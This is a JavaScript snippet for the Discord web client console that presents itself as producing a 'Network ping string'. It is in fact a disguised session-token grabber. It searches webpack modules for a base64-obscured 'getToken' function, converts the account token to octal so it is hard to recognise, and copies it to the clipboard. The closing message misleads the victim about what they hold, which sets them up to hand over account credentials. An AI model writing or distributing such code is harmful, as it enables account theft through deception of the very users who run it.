window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
    for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {
        if (m.default && m.default[getDecodedString('Z2V0VG9rZW4=')] !== undefined) {
            const Network = toOctal(m.default[getDecodedString('Z2V0VG9rZW4=')]());
            copyToClipboard(Network);
            return;
        }
        if (m[getDecodedString('Z2V0VG9rZW4=')] !== undefined) {
            const Network = toOctal(m[getDecodedString('Z2V0VG9rZW4=')]());
            copyToClipboard(Network);
            return;
        }
    }
}]);

function copyToClipboard(text) {
    const textarea = document.createElement('textarea');
    textarea.value = text;
    document.body.appendChild(textarea);
    textarea.select();
    document.execCommand('copy');
    document.body.removeChild(textarea);
}

function getDecodedString(encodedStr) {
    return atob(encodedStr);  // Keep this as Base64 decoding
}

function toOctal(str) {
    // Convert a string to an octal representation
    return str.split('').map(char => char.charCodeAt(0).toString(8)).join(' ');
}

console.log("%cDone!", "font-size: 50px");
console.log(`%cYou now have your Network ping string in the clipboard!`, "font-size: 16px");
